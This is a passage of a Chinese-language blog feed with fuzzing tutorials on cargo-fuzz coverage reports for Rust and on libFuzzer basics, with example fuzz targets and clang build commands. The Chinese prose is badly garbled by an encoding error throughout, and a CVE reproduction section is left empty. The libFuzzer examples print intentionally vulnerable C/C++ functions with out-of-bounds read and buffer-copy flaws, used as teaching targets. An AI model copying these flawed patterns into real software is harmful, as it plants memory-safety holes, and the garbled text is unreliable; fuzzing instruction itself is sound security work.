è¦†ç›–ç‡" class="headerlink" title="æµ‹é‡ä»£ç è¦†ç›–ç‡"></a>æµ‹é‡ä»£ç è¦†ç›–ç‡</h2><h3 id="ç¯å¢ƒæ­å»º-2"><a href="#ç¯å¢ƒæ­å»º-2" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">å®‰è£… Nightly å·¥å…·é“¾</span><br>rustup install nightly<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">ä¸º Nightly å®‰è£… LLVM å·¥å…·é›†ï¼ˆç”¨äº coverageï¼‰</span><br>rustup component add --toolchain nightly llvm-tools-preview<br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo fuzz coverage fuzz_target_name path/to/corpus/ -- &lt;target args&gt;<br></code></pre></td></tr></table></figure><ul><li>è‡ªåŠ¨ä½¿ç”¨ <code>-C instrument-coverage</code> é‡æ–°ç¼–è¯‘ä½ çš„ç›®æ ‡ç¨‹åºï¼ˆ<code>nightly</code> å·¥å…·é“¾ï¼‰ã€‚</li><li>éå†è¯­æ–™åº“ï¼ˆcorpusï¼‰ç›®å½•ä¸­çš„æ¯ä¸ªè¾“å…¥ï¼Œåœ¨å­ç›®å½• <code>fuzz/coverage/&lt;target&gt;/raw/</code> ä¸­ç”Ÿæˆ <code>.profraw</code> è¦†ç›–æ•°æ®ã€‚</li><li>è‡ªåŠ¨è°ƒç”¨ <code>llvm-profdata merge</code> åˆå¹¶ <code>.profraw</code> æ–‡ä»¶ä¸º <code>coverage.profdata</code>ã€‚</li></ul><h3 id="å¯è§†åŒ–è¦†ç›–ç‡ä¿¡æ¯"><a href="#å¯è§†åŒ–è¦†ç›–ç‡ä¿¡æ¯" class="headerlink" title="å¯è§†åŒ–è¦†ç›–ç‡ä¿¡æ¯"></a>å¯è§†åŒ–è¦†ç›–ç‡ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo install cargo-binutils<br>rustup component add llvm-tools-preview<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆ HTML æ ¼å¼è¦†ç›–ç‡æŠ¥å‘Šï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo cov show fuzz/target/x86_64-unknown-linux-gnu/release/url_fuzz_target \<br>  --format=html \<br>  --Xdemangler=rustfilt \<br>  --instr-profile=fuzz/coverage/url_fuzz_target/coverage.profdata \<br><span class="hljs-meta prompt_">  &gt; </span><span class="language-bash">coverage.html</span><br></code></pre></td></tr></table></figure><p>ç»ˆç«¯æŸ¥çœ‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">cargo cov show --use-color \<br>  --instr-profile=fuzz/coverage/url_fuzz_target/coverage.profdata \<br>  fuzz/target/.../url_fuzz_target \<br>  --show-functions --show-instantiations<br></code></pre></td></tr></table></figure><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><blockquote><p>CVE-2020-36435ï¼šPNG è§£ç å™¨ä¸­çš„æ•´æ•°æº¢å‡º</p></blockquote><p>ä½¿ç”¨ afl.rs å¤ç° CVE-2020-36435</p><ul><li>ç¯å¢ƒæ­å»º</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><ul><li>Fuzz</li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¯¹æ¯”ä¸¤ä¸ª Fuzzå·¥å…·ï¼š<code>cargo-fuzz</code>åŸºäº LibFuzzerï¼Œé€‚åˆå¿«é€Ÿä¸Šæ‰‹å’Œå‡½æ•°çº§æ¨¡ç³Šæµ‹è¯•ï¼›è€Œ<code>afl.rs</code>åŸºäº AFLï¼Œæ›´é€‚åˆç¨³å®šç‰ˆæœ¬ Rust å’Œé«˜æ€§èƒ½çš„ç¨‹åºçº§ fuzzã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://github.com/rust-fuzz/trophy-case">rust-fuzz&#x2F;trophy-case: ğŸ† Collection of bugs uncovered by fuzzing Rust code</a><br><a href="https://docs.rs/afl-stat/latest/afl_stat/#:~:text=This%20crate%20implement%20parsing%20AFL,file%20generated%20by%20AFL%20instances">afl_stat - Rust</a><br><a href="https://rust-fuzz.github.io/book/afl/setup.html">è®¾ç½® - Rust Fuzz Book</a><br><a href="https://github.com/rust-fuzz/afl.rs/tree/master">rust-fuzz&#x2F;afl.rs: ğŸ‡ Fuzzing Rust code with American Fuzzy Lop</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>libFuzzeræµ…æ¢</title>
      <link href="/2025/07/01/fuzz/libfuzzer/"/>
      <url>/2025/07/01/fuzz/libfuzzer/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>libFuzzer æ˜¯ä¸€ä¸ªåŸºäºè¦†ç›–ç‡å¼•å¯¼çš„è¿›åŒ–æ¨¡ç³Šæµ‹è¯•å¼•æ“ï¼Œæ—¨åœ¨é€šè¿‡ä»£ç è¦†ç›–ä¼˜åŒ–è¾“å…¥æ•°æ®ï¼Œä»è€Œå‘ç°æ½œåœ¨çš„ç¨‹åºæ¼æ´ã€‚libFuzzer ä»¥åº“çš„å½¢å¼é“¾æ¥åˆ°ç›®æ ‡ä»£ç ä¸­ï¼Œä¸“é—¨ç”¨äº fuzz æµ‹è¯•æŒ‡å®šçš„ç›®æ ‡å‡½æ•°ã€‚é€šè¿‡åŠ¨æ€åœ°å°† fuzz è¾“å…¥æä¾›ç»™ç›®æ ‡å‡½æ•°ï¼ŒlibFuzzer èƒ½å¤Ÿæœ‰æ•ˆåœ°å¼•å¯¼æµ‹è¯•è¿‡ç¨‹ï¼Œä¼˜åŒ–è¦†ç›–çš„è·¯å¾„ï¼Œå¹¶ä¸”é€šå¸¸ç”¨äº C&#x2F;C++ é¡¹ç›®çš„å•å…ƒæµ‹è¯•ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ¨¡ç³Šæµ‹è¯•çš„ç›®æ ‡ä¸ libFuzzer æœ¬èº«æ— å…³ï¼Œå› æ­¤å¯ä»¥å°†å…¶ä¸å…¶ä»–æ¨¡ç³Šæµ‹è¯•å¼•æ“ï¼ˆå¦‚ AFL æˆ– Radamsaï¼‰ç»“åˆä½¿ç”¨ï¼Œä»¥å¢å¼ºæµ‹è¯•æ•ˆæœã€‚</p><p>libFuzzer åŸºäº LLVM é¡¹ç›®å®ç°ï¼Œæ˜¯ä¸€ä¸ªç¼–è¯‘å¥½çš„é“¾æ¥åº“ï¼Œç‰¹åˆ«é€‚ç”¨äºæœ‰æºä»£ç çš„ç¨‹åºï¼Œä¸”ç¨‹åºå·²ç»è®¾è®¡äº†èƒ½å¤Ÿå¤„ç† fuzz è¾“å…¥çš„æ¥å£ã€‚</p><ul><li>ä¼ ç»Ÿ Fuzz</li></ul><p>ä¼ ç»Ÿæ¨¡ç³Šæµ‹è¯•çš„åŸºæœ¬æ€è·¯æ˜¯å‘ç›®æ ‡ç¨‹åºè¾“å…¥éšæœºæ•°æ®ï¼Œè§‚å¯Ÿç¨‹åºæ˜¯å¦å‘ç”Ÿå´©æºƒæˆ–å…¶ä»–å¼‚å¸¸è¡Œä¸ºã€‚è¿™äº›è¾“å…¥æ•°æ®æ²¡æœ‰ç‰¹åˆ«çš„å¼•å¯¼ï¼Œé€šå¸¸æ˜¯çº¯ç²¹çš„éšæœºå­—èŠ‚æµæˆ–å˜ç§ã€‚</p><ul><li>è¦†ç›–ç‡å¼•å¯¼ Fuzz</li></ul><p>è¦†ç›–å¼•å¯¼æ¨¡ç³Šæµ‹è¯•é€šè¿‡åˆ†æç¨‹åºçš„æ‰§è¡Œè·¯å¾„ï¼ˆå³ä»£ç è¦†ç›–ç‡ï¼‰ï¼Œæ¥æŒ‡å¯¼ç”Ÿæˆæ›´æœ‰é’ˆå¯¹æ€§çš„æµ‹è¯•ç”¨ä¾‹ã€‚å®ƒä¸ä»…ä»…ç”Ÿæˆéšæœºæ•°æ®ï¼Œè€Œæ˜¯æ ¹æ®ç¨‹åºæ‰§è¡Œçš„ä»£ç è·¯å¾„åé¦ˆæ¥ä¼˜åŒ–è¾“å…¥ï¼Œä»è€Œè¦†ç›–ç¨‹åºæ›´å¤šçš„åˆ†æ”¯å’Œä»£ç åŒºåŸŸã€‚</p><p>libFuzzer æ˜¯ LLVM é¡¹ç›®çš„ä¸€éƒ¨åˆ†ï¼Œå®ç°ä»£ç åœ¨<code>llvm-project/compiler-rt/lib/fuzzer</code>ç›®å½•ä¸‹ã€‚</p><h3 id="ç›®æ ‡å‡½æ•°"><a href="#ç›®æ ‡å‡½æ•°" class="headerlink" title="ç›®æ ‡å‡½æ•°"></a>ç›®æ ‡å‡½æ•°</h3><p>LibFuzzer ä¸æ˜¯å¯¹æ•´ä¸ªç¨‹åºè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œè€Œæ˜¯æµ‹è¯•ä¸€ä¸ªæ ¼å¼ä¸ºå¦‚ä¸‹ç­¾åçš„å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">int</span> <span class="hljs-title function_">LLVMFuzzerTestOneInput</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *Data, <span class="hljs-type">size_t</span> Size)</span>;<br></code></pre></td></tr></table></figure><p>ä½ éœ€è¦è‡ªå·±å®ç°è¿™ä¸ªå‡½æ•°ï¼ŒLibFuzzer ä¼šä¸æ–­è°ƒç”¨å®ƒï¼Œå¹¶æä¾›ä¸åŒçš„<code>Data</code>å’Œ<code>Size</code>ã€‚</p><p>libFuzzerä»¥<code>LLVMFuzzerTestOneInput()</code>ä½œä¸ºç”¨æˆ·è‡ªå®šä¹‰çš„æ¨¡ç³Šæµ‹è¯•å…¥å£ç‚¹ï¼Œç”¨æˆ·åªéœ€è¦å…³æ³¨ä¸º libFuzzer ç”Ÿæˆçš„æ•°æ®ç¼–å†™æ¥å£è°ƒç”¨é€»è¾‘ï¼Œè€Œ libFuzzer æœ¬èº«åªéœ€è¦åšå¥½æ•°æ®ç”Ÿæˆå³å¯ã€‚libFuzzer çš„æ•°æ®ç”Ÿæˆä¸»è¦ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š</p><ol><li>ç”¨æˆ·æŒ‡å®šçš„åˆå§‹æ•°æ®</li><li>æ•°æ®å˜å¼‚</li><li>æ–°è·¯å¾„å‘ç°</li></ol><p>libFuzzer å·¥ä½œè¿‡ç¨‹ä¹Ÿå¯ä»¥ç®€å•åœ°å½’çº³ä¸ºï¼š</p><ol><li>åˆå§‹åŒ–</li><li>ç”Ÿæˆæ•°æ®</li><li>å¼€å§‹æµ‹è¯•</li><li>æ”¶é›†ä»£ç è¦†ç›–ç‡ä¿¡æ¯</li><li>ç”Ÿæˆæ•°æ®</li><li>å¼€å§‹æµ‹è¯•</li></ol><p>åˆ†æ libFuzzer çš„å¯åŠ¨è¿‡ç¨‹æˆ‘ä»¬å¯ä»¥æŒ‡å®šï¼Œå®ƒçš„æ•´ä¸ªæ¡†æ¶æ ¸å¿ƒç”±ï¼š</p><ul><li>æ•°æ®å˜å¼‚ç”Ÿæˆå™¨</li><li>æ•°æ®æ”¶é›†å™¨</li><li>fuzzeræ ¸å¿ƒé€»è¾‘æ¨¡å—</li></ul><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>clang 6.0 åŠæ›´é«˜ç‰ˆæœ¬å·²ç»åŒ…å«äº† libFuzzerï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦å®‰è£… clang å³å¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt install clang llvm<br></code></pre></td></tr></table></figure><h2 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h2><p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡ libFuzzer work ä¸­çš„ç¤ºä¾‹æ¥å­¦ä¹ å¦‚ä½•ç¼–å†™ libFuzzerã€‚</p><p>ä½¿ç”¨ libFuzzer çš„ç¬¬ä¸€æ­¥æ˜¯å®ç°ä¸€ä¸ªæ¨¡ç³Šç›®æ ‡ï¼ˆfuzz targetï¼‰ï¼Œè¿™æ˜¯ä¸€ä¸ªæ¥å—å­—èŠ‚æ•°ç»„å¹¶é€šè¿‡è¢«æµ‹è¯•çš„ API æ‰§è¡ŒæŸäº›æ“ä½œçš„å‡½æ•°ã€‚ä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><h3 id="ç¤ºä¾‹1"><a href="#ç¤ºä¾‹1" class="headerlink" title="ç¤ºä¾‹1"></a>ç¤ºä¾‹1</h3><ul><li>æ¼æ´å‡½æ•°</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">VulnerableFunction1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>* data, <span class="hljs-type">size_t</span> size)</span> &#123;<br>  <span class="hljs-type">bool</span> result = <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">if</span> (size &gt;= <span class="hljs-number">3</span>) &#123;<br>    result = data[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;F&#x27;</span> &amp;&amp;<br>             data[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;U&#x27;</span> &amp;&amp;<br>             data[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;Z&#x27;</span> &amp;&amp;<br>             data[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;Z&#x27;</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ç¼–å†™ fuzzer</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;vulnerable_functions.h&quot;</span></span><br><br><span class="hljs-comment">//é€šè¿‡æ¥å£å°†æ•°æ®æŠ•å–‚åˆ°ç›®æ ‡å‡½æ•°</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">int</span> <span class="hljs-title function_">LLVMFuzzerTestOneInput</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *data, <span class="hljs-type">size_t</span> size)</span> &#123;<br>Â  VulnerableFunction1(data, size);<br>Â  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ç¼–è¯‘</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang++ -fsanitize=address,fuzzer first_fuzzer.cc -o first_fuzzer<br></code></pre></td></tr></table></figure><ul><li><code>-fsanitize=fuzzer</code>ï¼šå¯ç”¨ LibFuzzer</li><li><code>-fsanitize=address</code>ï¼šå¯ç”¨ ASan æ£€æµ‹å†…å­˜é”™è¯¯</li></ul><p>åˆ›å»ºä¸€ä¸ªç©ºç›®å½•ç”¨äºå­˜æ”¾æµ‹è¯•ç”¨ä¾‹ï¼Œå¹¶è¿è¡Œ Fuzz ç¨‹åºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> corpus<br>./first corpus<br></code></pre></td></tr></table></figure><p>libFuzzer é€šè¿‡ä¸è¢«æµ‹è¯•çš„åº“é“¾æ¥ï¼Œå‘è¯¥åº“çš„ç‰¹å®šå…¥å£å‡½æ•°ï¼ˆå³â€œç›®æ ‡å‡½æ•°â€ï¼‰æä¾›æ¨¡ç³Šçš„è¾“å…¥ã€‚æ¨¡ç³Šæµ‹è¯•å¼•æ“é€šè¿‡è¿½è¸ªä»£ç è¦†ç›–çš„åŒºåŸŸæ¥å·¥ä½œï¼Œå¹¶å¯¹è¾“å…¥æ•°æ®è¿›è¡Œå˜å¼‚ï¼Œä»¥æœ€å¤§åŒ–ä»£ç çš„è¦†ç›–ç‡ã€‚libFuzzer é€šè¿‡ LLVM çš„ SanitizerCoverage æ’ä»¶æ¥è·å–ä»£ç è¦†ç›–ä¿¡æ¯ã€‚</p><ul><li>Fuzzing</li></ul><p>è¿è¡Œ Fuzzer ç¨‹åºå³å¯è¿›è¡Œ Fuzzï¼Œå¦‚æœç¨‹åºå´©æºƒå°±ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆ crash æ ·æœ¬ã€‚</p><p><img src="/Linux/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/assets/Pasted%20image%2020250428115206.png"></p><p>å¯ä»¥çœ‹åˆ°ä»¥ä¸Š crash æ ·æœ¬å†…å®¹å°±æ˜¯<code>FUZ</code>ã€‚</p><p>å½“æ¨¡ç³Šæµ‹è¯•ç¨‹åºå‘ç°æ–°çš„æœ‰è¶£çš„æµ‹è¯•ç”¨ä¾‹ï¼ˆå³ é€šè¿‡è¢«æµ‹ä»£ç è§¦å‘æ–°è·¯å¾„çš„è¦†ç›–ç‡ï¼‰ï¼Œè¿™äº›æµ‹è¯•ç”¨ä¾‹ å°†æ·»åŠ åˆ° corpus ç›®å½•ä¸­ã€‚</p><ul><li>å¤ç°å´©æºƒ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./first_fuzzer crash-0eb8e4ed029b774d80f2b66408203801cb982a60<br></code></pre></td></tr></table></figure><p><img src="/Linux/assets/Pasted%20image%2020250530075533.png"></p><p>ASan ä¼šæ˜¾ç¤ºå‡ºå½“å‰ crash çš„å †æ ˆä¿¡æ¯ã€‚</p><p>è·å–ç¬¦å·åŒ–çš„å †æ ˆè·Ÿè¸ªã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ASAN_OPTIONS=symbolize=1 ./first_fuzzer crash-0eb8e4ed029b774d80f2b66408203801cb982a60<br></code></pre></td></tr></table></figure><p><code>symbolize=1</code>å¯ç”¨å †æ ˆè·Ÿè¸ªçš„ç¬¦å·åŒ–è§£æï¼Œå°†äºŒè¿›åˆ¶åœ°å€è½¬æ¢ä¸ºå¯è¯»çš„ä»£ç ä½ç½®ï¼ˆå¦‚å‡½æ•°åã€æºæ–‡ä»¶è¡Œå·ï¼‰ã€‚</p><h3 id="ç¤ºä¾‹2"><a href="#ç¤ºä¾‹2" class="headerlink" title="ç¤ºä¾‹2"></a>ç¤ºä¾‹2</h3><p>ç¤ºä¾‹ 2 å‡½æ•°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">auto</span> kMagicHeader = <span class="hljs-string">&quot;ZN_2016&quot;</span>;<br><span class="hljs-keyword">constexpr</span> std::<span class="hljs-type">size_t</span> kMaxPacketLen = <span class="hljs-number">1024</span>;<br><span class="hljs-keyword">constexpr</span> std::<span class="hljs-type">size_t</span> kMaxBodyLength = <span class="hljs-number">1024</span> - <span class="hljs-built_in">sizeof</span>(kMagicHeader);<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">VulnerableFunction2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>* data, <span class="hljs-type">size_t</span> size, <span class="hljs-type">bool</span> verify_hash)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (size &lt; <span class="hljs-built_in">sizeof</span>(kMagicHeader))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>  <span class="hljs-function">std::string <span class="hljs-title">header</span><span class="hljs-params">(<span class="hljs-keyword">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> <span class="hljs-type">char</span>*&gt;(data), <span class="hljs-keyword">sizeof</span>(kMagicHeader))</span></span>;<br><br>  std::array&lt;<span class="hljs-type">uint8_t</span>, kMaxBodyLength&gt; body;<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(kMagicHeader, header.<span class="hljs-built_in">c_str</span>()))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>  <span class="hljs-keyword">auto</span> target_hash = data[--size];<br><br>  <span class="hljs-keyword">if</span> (size &gt; kMaxPacketLen)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>  <span class="hljs-keyword">if</span> (!verify_hash)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>  std::<span class="hljs-built_in">copy</span>(data, data + size, body.<span class="hljs-built_in">data</span>());<br>  <span class="hljs-keyword">auto</span> real_hash = <span class="hljs-built_in">DummyHash</span>(body);<br>  <span class="hljs-keyword">return</span> real_hash == target_hash;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ç¼–å†™fuzzer</li></ul><p>ä¸ç¬¬ä¸€ä¸ª fuzzer åŸºæœ¬ç›¸åŒã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;vulnerable_functions.h&quot;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">LLVMFuzzerTestOneInput</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *data, <span class="hljs-type">size_t</span> size)</span> </span>&#123;<br>  <span class="hljs-built_in">VulnerableFunction2</span>(data, size, <span class="hljs-literal">false</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ç¼–è¯‘</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang++ -g -std=c++11 -fsanitize=address,fuzzer second_fuzzer.cc -o second_fuzzer<br></code></pre></td></tr></table></figure><ul><li>è¿è¡Œ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> corpus2<br>./second_fuzzer corpus2<br></code></pre></td></tr></table></figure><h3 id="ç¤ºä¾‹3"><a href="#ç¤ºä¾‹3" class="headerlink" title="ç¤ºä¾‹3"></a>ç¤ºä¾‹3</h3><ul><li>ç¤ºä¾‹ 3 å‡½æ•°</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">constexpr</span> std::<span class="hljs-type">size_t</span> kZn2016VerifyHashFlag = <span class="hljs-number">0x0001000</span>;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">VulnerableFunction3</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>* data, <span class="hljs-type">size_t</span> size, std::<span class="hljs-type">size_t</span> flags)</span> </span>&#123;<br>Â  <span class="hljs-type">bool</span> verify_hash = flags &amp; kZn2016VerifyHashFlag;<br>Â  <span class="hljs-keyword">return</span> <span class="hljs-built_in">VulnerableFunction2</span>(data, size, verify_hash);<br>&#125;<br></code></pre></td></tr></table></figure><p>å®ƒå®é™…ä¸Šåªæ˜¯å¯¹ä¹‹å‰é‚£ä¸ªæ˜“å—æ”»å‡»çš„å‡½æ•°çš„ä¸€ä¸ªåŒ…è£…ï¼Œå…³é”®ç‚¹åœ¨äº <code>flags</code> çš„å¯èƒ½å€¼ç©ºé—´å¾ˆå¤§ã€‚</p><p><strong>æ³¨æ„</strong>ï¼šå‡è®¾æœ‰å¤šä¸ªä¸åŒçš„ <code>flags</code> å€¼æ˜¯å¯èƒ½çš„ã€‚å¦‚æœä½ éœ€è¦çµæ„Ÿï¼Œå¯ä»¥å‚è€ƒ <code>open()</code> å‡½æ•°çš„ <code>flags</code> å’Œ <code>mode</code> å‚æ•°çš„å¯èƒ½å€¼ã€‚</p><p>æšä¸¾æ‰€æœ‰å¯èƒ½çš„ç»„åˆåœ¨æ¨¡ç³Šæµ‹è¯•å™¨ä¸­ä¼¼ä¹ä¸åˆç†ã€‚å¹¶ä¸”æ²¡æœ‰ä¿è¯å°†æ¥ä¸ä¼šæ·»åŠ æ–°çš„å¯èƒ½å€¼ã€‚</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ <code>libFuzzer</code> æä¾›çš„æ•°æ®æ¥å¯¹ <code>flags</code> å€¼è¿›è¡ŒéšæœºåŒ–ï¼š</p><ul><li>fuzzer</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;vulnerable_functions.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;functional&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">LLVMFuzzerTestOneInput</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *data, <span class="hljs-type">size_t</span> size)</span> </span>&#123;<br>  <span class="hljs-function">std::string <span class="hljs-title">data_string</span><span class="hljs-params">(<span class="hljs-keyword">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> <span 